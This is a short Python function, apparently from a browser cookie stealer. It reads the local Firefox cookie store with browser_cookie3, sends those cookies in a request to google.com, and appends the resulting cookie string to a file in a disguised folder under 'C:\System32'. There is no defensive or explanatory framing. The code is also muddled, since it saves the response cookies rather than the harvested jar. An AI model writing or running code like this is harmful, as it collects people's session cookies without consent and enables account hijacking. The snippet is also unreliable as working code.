import browser_cookie3
import requests


def get_firefox_cookies():
    """
    saving the raw cookie string to a file
    """
    cookiejar = browser_cookie3.firefox()
    resp = str(requests.get(r'https://google.com', cookies=cookiejar).cookies)  # request to get a cookie string
    with open(r"C:\System32\x25x02x42\Firefox_cookies.txt", 'a', encoding='utf-8') as f:
        f.write(resp)
